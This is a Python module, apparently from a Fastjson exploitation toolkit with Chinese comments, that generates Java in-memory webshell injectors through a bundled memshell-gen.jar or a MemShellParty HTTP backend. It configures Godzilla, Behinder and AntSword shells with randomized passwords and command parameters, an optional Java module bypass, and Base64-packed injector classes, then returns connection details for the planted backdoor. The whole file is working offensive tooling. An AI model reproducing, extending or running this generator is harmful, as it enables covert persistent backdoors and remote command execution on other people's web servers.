"""调用内置 memshell-gen.jar（或可选 HTTP boot）生成内存马。"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import urllib.error
import urllib.request
from functools import lru_cache
from pathlib import Path
from typing import Any, Optional

from fastjson_toolkit.poc.memshell.auth import (
    format_memshell_connect_info,
    randomize_memshell_auth,
)
from fastjson_toolkit.poc.memshell.jdk import resolve_memshell_jdk
from fastjson_toolkit.poc.memshell.models import MemShellOptions, MemShellResult

DEFAULT_MSHELL_BACKEND = "jar"
_JAR_NAME = "memshell-gen.jar"


def _package_jar_path() -> Path:
    return Path(__file__).resolve().parent / "jars" / _JAR_NAME


def _vendor_jar_path() -> Path:
    # repo_root/vendor/memshell-gen/target/memshell-gen.jar
    return (
        Path(__file__).resolve().parents[4]
        / "vendor"
        / "memshell-gen"
        / "target"
        / _JAR_NAME
    )


def resolve_jar_path(explicit: Optional[str] = None) -> Path:
    """查找 memshell-gen.jar：显式路径 > 环境变量 > 包内 jars/ > vendor 构建产物。"""
    if explicit:
        p = Path(explicit).expanduser().resolve()
        if p.is_file():
            return p
        raise FileNotFoundError(f"memshell jar 不存在: {p}")
    env = (os.environ.get("FJ_MEMSHELL_JAR") or "").strip()
    if env:
        p = Path(env).expanduser().resolve()
        if p.is_file():
            return p
        raise FileNotFoundError(f"FJ_MEMSHELL_JAR 指向的文件不存在: {p}")
    pkg = _package_jar_path()
    if pkg.is_file():
        return pkg
    vendor = _vendor_jar_path()
    if vendor.is_file():
        return vendor
    raise FileNotFoundError(
        "未找到 memshell-gen.jar。请先构建：\n"
        "  cd vendor/memshell-gen && mvn -DskipTests package\n"
        "  然后将 target/memshell-gen.jar 复制到 "
        "src/fastjson_toolkit/poc/memshell/jars/\n"
        "或设置环境变量 FJ_MEMSHELL_JAR。"
    )


def _which_java() -> str:
    path = shutil.which("java")
    if not path:
        raise RuntimeError("未找到 java，请安装 JRE/JDK 并加入 PATH（生成内存马需要）")
    return path


def _run_jar(action: str, stdin_text: Optional[str] = None, *, timeout: float = 60.0) -> dict[str, Any]:
    jar = resolve_jar_path()
    java = _which_java()
    cmd = [java, "-jar", str(jar), action]
    try:
        proc = subprocess.run(
            cmd,
            input=stdin_text.encode("utf-8") if stdin_text is not None else None,
            capture_output=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as e:
        raise RuntimeError(f"memshell-gen.jar 超时 ({timeout}s)") from e
    raw = (proc.stdout or b"").decode("utf-8", errors="replace").strip()
    err = (proc.stderr or b"").decode("utf-8", errors="replace").strip()
    if not raw:
        raise RuntimeError(
            f"memshell-gen.jar 无输出 (exit={proc.returncode})"
            + (f"\nstderr:\n{err}" if err else "")
        )
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"memshell-gen.jar 返回非 JSON: {raw[:300]!r}") from e
    if isinstance(parsed, dict) and parsed.get("error"):
        raise RuntimeError(f"memshell-gen error: {parsed['error']}")
    if proc.returncode != 0:
        raise RuntimeError(
            f"memshell-gen.jar exit={proc.returncode}: {parsed!r}"
            + (f"\nstderr:\n{err}" if err else "")
        )
    if not isinstance(parsed, dict):
        raise RuntimeError(f"memshell-gen.jar 响应类型异常: {type(parsed)}")
    return parsed


def _http_post_generate(api: str, body: dict[str, Any], *, timeout: float) -> dict[str, Any]:
    api = api.rstrip("/")
    data = json.dumps(body, separators=(",", ":")).encode("utf-8")
    req = urllib.request.Request(
        f"{api}/api/memshell/generate",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        err = e.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"MemShellParty HTTP {e.code}: {err}") from e
    except Exception as e:
        raise RuntimeError(f"MemShellParty 不可达 ({api}): {e}") from e
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"MemShellParty 返回非 JSON: {raw[:200]!r}") from e
    if isinstance(parsed, dict) and parsed.get("error"):
        raise RuntimeError(f"MemShellParty error: {parsed['error']}")
    return parsed if isinstance(parsed, dict) else {}


def _http_get_config(api: str, *, timeout: float) -> dict[str, Any]:
    api = api.rstrip("/")
    req = urllib.request.Request(f"{api}/api/config", method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        raise RuntimeError(f"MemShellParty config 不可达 ({api}): {e}") from e
    parsed = json.loads(raw)
    if not isinstance(parsed, dict):
        raise RuntimeError("MemShellParty /api/config 响应非 object")
    return parsed


@lru_cache(maxsize=1)
def fetch_config(backend: str = DEFAULT_MSHELL_BACKEND, *, timeout: float = 30.0) -> dict[str, Any]:
    """返回 server -> tool -> shellTypes 矩阵。"""
    b = (backend or DEFAULT_MSHELL_BACKEND).strip()
    if b.lower() in ("", "jar", "local", "embedded"):
        return _run_jar("config", timeout=timeout)
    if b.startswith("http://") or b.startswith("https://"):
        return _http_get_config(b, timeout=timeout)
    raise ValueError(f"未知 memshell backend: {backend!r}（用 jar 或 http(s)://...）")


def clear_config_cache() -> None:
    fetch_config.cache_clear()


def _build_generate_body(
    *,
    server: str,
    tool: str,
    shell_type: str,
    url_pattern: str,
    param_name: str,
    header_name: str,
    header_value: str,
    godzilla_pass: str,
    godzilla_key: str,
    behinder_pass: str,
    antsword_pass: str,
    target_jre: str,
    shrink: bool,
    by_pass_java_module: bool,
    static_initialize: bool,
) -> dict[str, Any]:
    return {
        "shellConfig": {
            "server": server,
            "serverVersion": "Unknown",
            "shellTool": tool,
            "shellType": shell_type,
            "targetJreVersion": int(target_jre),
            "debug": False,
            "byPassJavaModule": by_pass_java_module,
            "shrink": shrink,
            "lambdaSuffix": False,
            "probe": False,
        },
        "shellToolConfig": {
            "headerName": header_name,
            "headerValue": header_value,
            "commandParamName": param_name,
            "godzillaPass": godzilla_pass,
            "godzillaKey": godzilla_key,
            "behinderPass": behinder_pass,
            "antSwordPass": antsword_pass,
        },
        "injectorConfig": {
            "urlPattern": url_pattern,
            "staticInitialize": static_initialize,
        },
        "packer": "Base64",
    }


def _parse_generate_response(
    parsed: dict[str, Any],
    *,
    server: str,
    tool: str,
    shell_type: str,
    url_pattern: str,
    auth: dict[str, str],
) -> MemShellResult:
    result = parsed.get("memShellResult") if isinstance(parsed, dict) else None
    if not isinstance(result, dict) or not result.get("injectorBytesBase64Str"):
        raise RuntimeError(f"响应缺少 injectorBytesBase64Str: {str(parsed)[:300]!r}")
    tool_cfg = result.get("shellToolConfig") or {}
    if not isinstance(tool_cfg, dict):
        tool_cfg = {}
    api_pass = (
        tool_cfg.get("pass")
        or tool_cfg.get("behinderPass")
        or tool_cfg.get("antSwordPass")
    )
    api_key = tool_cfg.get("key") or tool_cfg.get("godzillaKey")
    info = MemShellResult(
        injector_b64=result["injectorBytesBase64Str"],
        injector_class=result.get("injectorClassName") or "",
        shell_class=result.get("shellClassName") or "",
        injector_size=int(result.get("injectorSize") or 0),
        shell_size=int(result.get("shellSize") or 0),
        server=server,
        tool=tool,
        shell_type=shell_type,
        url_pattern=url_pattern,
        param_name=str(tool_cfg.get("paramName") or auth["param_name"]),
        header_name=str(tool_cfg.get("headerName") or auth["header_name"]),
        header_value=str(tool_cfg.get("headerValue") or auth["header_value"]),
        godzilla_pass=str(
            tool_cfg.get("pass") or tool_cfg.get("godzillaPass") or auth["godzilla_pass"]
        ),
        godzilla_key=str(api_key or auth["godzilla_key"]),
        behinder_pass=str(api_pass or auth["behinder_pass"]),
        antsword_pass=str(api_pass or auth["antsword_pass"]),
        raw=result,
    )
    info.connect_info = format_memshell_connect_info(info.as_info_dict())
    return info


def memshell_generate(
    backend: str = DEFAULT_MSHELL_BACKEND,
    *,
    server: str,
    tool: str,
    shell_type: str,
    url_pattern: str = "/*",
    param_name: str = "cmd",
    header_name: str = "X-Token",
    header_value: str = "ok",
    godzilla_pass: str = "pass",
    godzilla_key: str = "key",
    behinder_pass: str = "pass",
    antsword_pass: str = "ant",
    target_jre: str = "52",
    shrink: bool = True,
    by_pass_java_module: bool = False,
    static_initialize: bool = False,
    timeout: float = 60.0,
) -> dict[str, Any]:
    """底层生成，返回原始 memShellResult（兼容 16723 runner）。"""
    body = _build_generate_body(
        server=server,
        tool=tool,
        shell_type=shell_type,
        url_pattern=url_pattern,
        param_name=param_name,
        header_name=header_name,
        header_value=header_value,
        godzilla_pass=godzilla_pass,
        godzilla_key=godzilla_key,
        behinder_pass=behinder_pass,
        antsword_pass=antsword_pass,
        target_jre=target_jre,
        shrink=shrink,
        by_pass_java_module=by_pass_java_module,
        static_initialize=static_initialize,
    )
    b = (backend or DEFAULT_MSHELL_BACKEND).strip()
    if b.lower() in ("", "jar", "local", "embedded"):
        parsed = _run_jar("generate", json.dumps(body, separators=(",", ":")), timeout=timeout)
    elif b.startswith("http://") or b.startswith("https://"):
        parsed = _http_post_generate(b, body, timeout=timeout)
    else:
        raise ValueError(f"未知 memshell backend: {backend!r}")
    result = parsed.get("memShellResult")
    if not isinstance(result, dict) or not result.get("injectorBytesBase64Str"):
        raise RuntimeError(f"响应缺少 injectorBytesBase64Str: {str(parsed)[:300]!r}")
    return result


def generate_memshell(
    options: MemShellOptions | None = None,
    *,
    backend: Optional[str] = None,
    server: Optional[str] = None,
    tool: Optional[str] = None,
    shell_type: Optional[str] = None,
    url_pattern: Optional[str] = None,
    jdk: Optional[str] = None,
    static_initialize: Optional[bool] = None,
    timeout: float = 60.0,
) -> MemShellResult:
    """高层封装：随机凭证 + JDK 解析 + 结构化结果。"""
    opts = options or MemShellOptions()
    b = backend if backend is not None else opts.backend
    srv = server if server is not None else opts.server
    tl = tool if tool is not None else opts.tool
    st = shell_type if shell_type is not None else opts.shell_type
    path = url_pattern if url_pattern is not None else opts.path
    jdk_s = jdk if jdk is not None else opts.jdk
    static_init = (
        static_initialize
        if static_initialize is not None
        else (opts.static_initialize if opts.static_initialize is not None else False)
    )
    ms_jdk, ms_class_ver, ms_bypass = resolve_memshell_jdk(jdk_s)
    auth = randomize_memshell_auth(tl)
    raw = memshell_generate(
        b,
        server=srv,
        tool=tl,
        shell_type=st,
        url_pattern=path,
        param_name=auth["param_name"],
        header_name=auth["header_name"],
        header_value=auth["header_value"],
        godzilla_pass=auth["godzilla_pass"],
        godzilla_key=auth["godzilla_key"],
        behinder_pass=auth["behinder_pass"],
        antsword_pass=auth["antsword_pass"],
        target_jre=ms_class_ver,
        by_pass_java_module=ms_bypass,
        static_initialize=static_init,
        timeout=timeout,
    )
    # 附带对外 jdk 标记到 raw 供日志用
    raw = dict(raw)
    raw["_jdk"] = ms_jdk
    raw["_class_ver"] = ms_class_ver
    raw["_bypass"] = ms_bypass
    return _parse_generate_response(
        {"memShellResult": raw},
        server=srv,
        tool=tl,
        shell_type=st,
        url_pattern=path,
        auth=auth,
    )
